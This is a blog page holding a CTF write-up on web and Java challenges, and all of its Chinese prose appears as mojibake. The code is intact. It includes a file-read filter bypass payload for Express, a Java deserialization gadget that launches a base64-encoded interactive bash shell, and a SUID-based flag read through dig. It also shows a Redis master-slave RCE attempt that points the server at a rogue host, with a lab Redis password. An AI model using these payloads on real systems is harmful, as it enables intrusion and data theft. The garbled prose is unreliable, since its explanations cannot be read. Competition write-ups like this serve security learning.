<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>[2023æŸé¹­æ¯]èµ›åæ€»ç»“ | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="[2023æŸé¹­æ¯]èµ›åæ€»ç»“ | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="Web WriteUP
express fs
é¦–é¡µå¯ä»¥è¯»æ–‡ä»¶ã€‚
main.js
const express = require(&quot;express&quot;);
const fs = require(&quot;fs&quot;)..." />
    <meta name="keywords" content="èµ›åæ€»ç»“,CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              [2023æŸé¹­æ¯]èµ›åæ€»ç»“
            </h2>
            <div class="post-info">
              <span>
                2023-10-11
              </span>
              <span>
                6 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/QGeg3Wbqm/" class="post-tag">
                  # èµ›åæ€»ç»“
                </a>
              
                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
                  # CTF
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-bo-lu-bei-sai-hou-zong-jie.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="web-writeup">Web WriteUP</h1>
<h2 id="express-fs">express fs</h2>
<p>é¦–é¡µå¯ä»¥è¯»æ–‡ä»¶ã€‚</p>
<p>main.js</p>
<pre><code class="language-java">const express = require(&quot;express&quot;);
const fs = require(&quot;fs&quot;);

const app = express();

const PORT = process.env.PORT || 80;

app.use('/static', express.static('static'))

app.use((req, res, next) =&gt; {
  if (
    [req.body, req.headers, req.query].some(
      (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)
    )
  ) {
    return res.send(&quot;è‡­é»‘å®¢!&quot;);
  }
  next();
});

app.get(&quot;/&quot;, (req, res) =&gt; {
  try {
    res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);
    res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());
  } catch (err) {
    console.log(err);
    res.status(500).send(&quot;Internal server error&quot;);
  }
});

app.listen(PORT, () =&gt; console.log(`express server listening on port ${PORT}`));

</code></pre>
<p>æœäº†ä¸‹ï¼Œæ²¡æƒ³åˆ°æ˜¯åŸé¢˜<a href="https://forum.butian.net/share/1986">fs.readFileSyncçš„åˆ©ç”¨</a></p>
<p><code>app.use</code>ä¸å…è®¸ä¼ å…¥çš„è¯·æ±‚ä½“ã€è¯·æ±‚å¤´ã€å‚æ•°åŒ…å«&quot;flag&quot;ï¼›<code>/</code>ä¸‹çš„fileå‚æ•°å¯ä»¥è¯»æ–‡ä»¶ã€‚</p>
<p>nodejsæœ‰ä¸ªç‰¹æ€§ï¼Œå¦‚æœä¼ å…¥å¤šä¸ª<code>query</code>å‚æ•°ï¼Œæ¯”å¦‚<code>?query=1&amp;query=2&amp;query=3</code>ã€‚nodejsåœ¨è§£æè¿™æ ·çš„å‚æ•°æ—¶ï¼Œä¸ä¼šç”¨åé¢çš„å€¼å»è¦†ç›–å‰é¢çš„ï¼Œè€Œæ˜¯å°†å…¶ä½œä¸ºä¸€ä¸ªæ•°ç»„ä¿å­˜ã€‚</p>
<p>è€Œ<code>fs.readFileSync()</code>å¯ä»¥æ¥å—ä¸€ä¸ªURLç±»å‹çš„å‚æ•°ï¼Œå®ƒå¯ä»¥æ˜¯ä¸€ä¸ªURLå¯¹è±¡æˆ–è€…å¯¹åº”æ ¼å¼çš„æ•°ç»„ã€‚<code>fs.readFileSync()</code>åœ¨è§£æè¿™ä¸ªURLçš„æ—¶å€™ä¼šè‡ªåŠ¨è¿›è¡ŒURLè§£ç ï¼Œæ‰€ä»¥è¿™æ—¶å¯ä»¥ç”¨URLç¼–ç ç»•è¿‡<code>app.use</code>ä¸­å¯¹flagçš„æ£€æµ‹ã€‚æ„é€ ä¸€ä¸ªfileåè®®çš„URLæ•°ç»„ä¼ å…¥ï¼Œpayloadå¦‚ä¸‹ï¼ˆå¯¹pathnameè¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼‰</p>
<pre><code>?file[href]=a&amp;file[origin]=1&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=/server/%2566%256c%2561%2567.txt
</code></pre>
<h2 id="ç»¼åˆé¢˜">ç»¼åˆé¢˜</h2>
<p>è¿™ä¸ªç¯å¢ƒä¸­æœ‰ä¸‰ä¸ªflag<br>
<img src="https://skyblu3519.github.io/post-images/1697039601712.png" alt="" loading="lazy"></p>
<h3 id="1">1</h3>
<p>ä¸Šä¼ æ–‡ä»¶åï¼Œviewå¤„å¯ä»¥ä»»æ„æ–‡ä»¶ä¸‹è½½<br>
<img src="https://skyblu3519.github.io/post-images/1697039621438.png" alt="" loading="lazy"></p>
<p>æ ¹æ®é¢˜ç›®çš„æç¤ºï¼Œå¯ä»¥æŠŠé¢˜ç›®çš„jaråŒ…ä¸‹è½½ä¸‹æ¥ï¼ˆ/app/demo.jarï¼‰ï¼Œåç¼–è¯‘å¾—åˆ°æºç ã€‚</p>
<p>åœ¨Upload.javaä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ªflagçš„ç‚¹<br>
<img src="https://skyblu3519.github.io/post-images/1697039641436.png" alt="" loading="lazy"></p>
<p>å‡½æ•°å®ç°äº†ä¸€ä¸ªå¼‚æˆ–åŠ å¯†ï¼Œ<code>O0O</code>æ˜¯å¯†é’¥ï¼Œenc_flag1åˆ™æ˜¯ç»è¿‡å‡½æ•°åŠ å¯†å†base64ç¼–ç çš„å†…å®¹ã€‚</p>
<p>å¼‚æˆ–æ˜¯å¯é€†çš„ï¼Œç®€å•å†™ä¸€ä¸‹è§£å¯†çš„ä»£ç </p>
<pre><code>public class Test {
    public static String enc_flag1 = &quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;;

    public static String key = &quot;6925cc02789c1d2552b71acc4a2d48fd&quot;;

    public static String decode(String result) {
        StringBuilder flag = new StringBuilder();
        byte[] decodedBytes = Base64.getDecoder().decode(result);
        String decodedString = new String(decodedBytes, StandardCharsets.UTF_8);
        for (int i = 0, len = decodedString.length(); i &lt; len; i++) {
            char f = decodedString.charAt(i);
            char k = key.charAt(i % key.length());
            char r = (char)(f ^ k);
            flag.append(r);
        }
        return flag.toString();
    }

    public static void main(String[] args) {
        System.out.println(decode(enc_flag1));
    }
}

</code></pre>
<p>å¾—åˆ°flag<br>
<img src="https://skyblu3519.github.io/post-images/1697039659733.png" alt="" loading="lazy"></p>
<h3 id="2">2</h3>
<p><code>/internalApi/v3.2/updateConfig</code>è·¯ç”±æœ‰ååºåˆ—åŒ–åŠŸèƒ½ï¼Œ<code>Ping</code>ååºåˆ—åŒ–ä¼šæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ç›´æ¥ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œå¼¹ä¸ªshellå‡ºæ¥</p>
<pre><code class="language-java">Ping p = new Ping();
p.setCommand(&quot;bash&quot;);
p.setArg1(&quot;-c&quot;);
p.setArg2(&quot;{echo,...}|{base64,-d}|{bash,-i}&quot;);

String s = serializeToBase64(p);
System.out.println(s);
</code></pre>
<p>ç›®å½•ä¸‹çš„hintæç¤ºflagæ‰€åœ¨çš„ä½ç½®ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™è¯»ã€‚</p>
<p>ä½¿ç”¨å‘½ä»¤<code>find / -perm -u=s -type f 2&gt;/dev/null</code>å¯»æ‰¾å…·æœ‰suidæƒé™çš„ç¨‹åºã€‚</p>
<p>æ‰¾åˆ°äº†digå‘½ä»¤<br>
<img src="https://skyblu3519.github.io/post-images/1697039687670.png" alt="" loading="lazy"></p>
<p>ç”¨-få‚æ•°è¯»å–flag<br>
<img src="https://skyblu3519.github.io/post-images/1697039696387.png" alt="" loading="lazy"></p>
<h1 id="æ²¡æœ‰è§£å‡ºçš„é¢˜">æ²¡æœ‰è§£å‡ºçš„é¢˜</h1>
<h2 id="ç»¼åˆ3">ç»¼åˆ3</h2>
<p>åœ¨è¯»å¯åŠ¨å‘½ä»¤çš„æ—¶å€™çŸ¥é“äº†å®ƒå¯åŠ¨çš„é…ç½®æ–‡ä»¶ä½ç½®<br>
<img src="https://skyblu3519.github.io/post-images/1697039706548.png" alt="" loading="lazy"></p>
<p>è¯»è¿™ä¸ªé…ç½®æ–‡ä»¶å¯ä»¥çœ‹åˆ°å†…ç½‘RedisæœåŠ¡çš„ä¿¡æ¯<br>
<img src="https://skyblu3519.github.io/post-images/1697039725752.png" alt="" loading="lazy"></p>
<p>åœ¨æœ‰äº†webçš„shellä¹‹åå°±æƒ³æ€ä¹ˆå»æ”»å‡»è¿™ä¸ªRedisã€‚å°†Javaä¸­ç”¨äºè¿æ¥Redisçš„<code>jedis</code>ä»¥åŠå…¶æ‰€ä¾èµ–çš„<code>slf4j</code>çš„jaråŒ…ï¼Œä¸Šä¼ ä¸Šå»ã€‚ç„¶åå†™ä¸€ä¸ªè¿æ¥æµ‹è¯•ä¸€ä¸‹</p>
<pre><code class="language-java">import redis.clients.jedis.Jedis;

public class RedisConnectionTest {
    private static final String REDIS_HOST = &quot;172.25.0.10&quot;;
    private static final int REDIS_PORT = 62341;
    private static final String REDIS_PASSWORD = &quot;de17cb1cfa1a8e8011f027b416775c6a&quot;;

    public static void main(String[] args) {
        try (Jedis jedis = new Jedis(REDIS_HOST, REDIS_PORT)) {
            jedis.auth(REDIS_PASSWORD);
            String response = jedis.ping();

            if (&quot;PONG&quot;.equals(response)) {
                System.out.println(&quot;Successfully connected to Redis!&quot;);
            } else {
                System.out.println(&quot;Connection to Redis failed!&quot;);
            }
        } catch (Exception e) {
            System.out.println(&quot;Failed to connect to Redis: &quot; + e.getMessage());
        }
    }
}
</code></pre>
<p>ç¼–è¯‘/è¿è¡Œ</p>
<pre><code class="language-shell">javac -cp .:jedis-3.7.0.jar RedisConnectionTest.java
java -cp .:jedis-3.7.0.jar:slf4j-api-1.7.32.jar:slf4j-simple-1.7.32.jar RedisConnectionTest
</code></pre>
<p>æµ‹è¯•æ˜¯å¯ä»¥è®¿é—®åˆ°Redisçš„ã€‚æ¥ç€å°è¯•è¯»å–Redisæ•°æ®åº“çš„å†…å®¹ï¼Œå‘ç°æ²¡æœ‰ä»»ä½•è®°å½•ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯å°è¯•Redisçš„RCEï¼Œæœç´¢ä¹‹åæ‰¾åˆ°äº†Redisä¸»ä»å¤åˆ¶RCEç›¸å…³çš„å†…å®¹</p>
<ul>
<li><a href="https://blog.csdn.net/Trouble_99/article/details/111561636">Redisæœªæˆæƒè®¿é—®åˆ©ç”¨RCEè¿›è¡Œæ¼æ´å¤ç°</a></li>
<li>åˆ©ç”¨å·¥å…·ï¼š
<ul>
<li><a href="https://github.com/Dliv3/redis-rogue-server/tree/master">https://github.com/Dliv3/redis-rogue-server/tree/master</a></li>
<li><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></li>
</ul>
</li>
</ul>
<p>ç”¨çš„æ˜¯ç¬¬ä¸€ä¸ªå·¥å…·ï¼Œåœ¨è¿œç¨‹å¯åŠ¨<code>python3 redis-rogue-server.py --server-only</code>ï¼Œç„¶åç”¨Javaç¨‹åºè®©Redisæ‰§è¡Œ<code>jedis.slaveof(ROGUE_REDIS_HOST, 21000);</code>ã€‚</p>
<p>æœ‰å›æ˜¾ï¼Œä½†æ˜¯æ²¡æœ‰Redisç›¸å…³çš„çŸ¥è¯†ï¼Œè¿™ä¸ªå†…å®¹ä¹Ÿä¸çŸ¥é“è¯´çš„æ˜¯ä¸ªå•¥<br>
<img src="https://skyblu3519.github.io/post-images/1697039793895.png" alt="" loading="lazy"></p>
<p>æœ€åæ—¶é—´ç»“æŸï¼Œå¾ˆå¯æƒœæ²¡æœ‰åšå‡ºæ¥....</p>
<p>ä¹‹åè¡¥ä¸€ä¸‹Redisç›¸å…³çš„å†…å®¹å‡†å¤‡ã€‚</p>
<h2 id="å‰©ä¸‹çš„é¢˜ç›®">å‰©ä¸‹çš„é¢˜ç›®</h2>
<p>å‰©ä¸‹äº†ä¸‰é“0è§£é¢˜ç›®<br>
<img src="https://skyblu3519.github.io/post-images/1697039801402.png" alt="" loading="lazy"></p>
<p>jdbcçŸ¥è¯†ç›²åŒºï¼Œç›´æ¥æ”¾å¼ƒã€‚</p>
<p>ååºåˆ—åŒ–å°±æ˜¯é‚£ç§çœ‹ä¸€çœ¼å°±æ˜ç™½ï¼Œä½†æ˜¯å°±æ˜¯è§£ä¸å‡ºçš„é¢˜ã€‚éå¸¸å®³æ€•<br>
<img src="https://skyblu3519.github.io/post-images/1697039848594.png" alt="" loading="lazy"></p>
<p>æ€»ä¹‹éå¸¸å®³æ€•</p>
<p>æœ€åçš„UAFç»“æœæ˜¯ä¸ªPWN....éš¾é¡¶</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>çªå‡»ä¸€ä¸‹Javaè¿˜æ˜¯æœ‰æ•ˆæœçš„ğŸ™ƒ</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#web-writeup">Web WriteUP</a>
<ul>
<li><a href="#express-fs">express fs</a></li>
<li><a href="#%E7%BB%BC%E5%90%88%E9%A2%98">ç»¼åˆé¢˜</a>
<ul>
<li><a href="#1">1</a></li>
<li><a href="#2">2</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%B2%A1%E6%9C%89%E8%A7%A3%E5%87%BA%E7%9A%84%E9%A2%98">æ²¡æœ‰è§£å‡ºçš„é¢˜</a>
<ul>
<li><a href="#%E7%BB%BC%E5%90%883">ç»¼åˆ3</a></li>
<li><a href="#%E5%89%A9%E4%B8%8B%E7%9A%84%E9%A2%98%E7%9B%AE">å‰©ä¸‹çš„é¢˜ç›®</a></li>
</ul>
</li>
<li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/java-fan-xu-lie-hua-3-cc-lian-6/">
              <h3 class="post-title">
                Javaååºåˆ—åŒ–ï¼ˆ3ï¼‰â€”â€” CCé“¾6
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
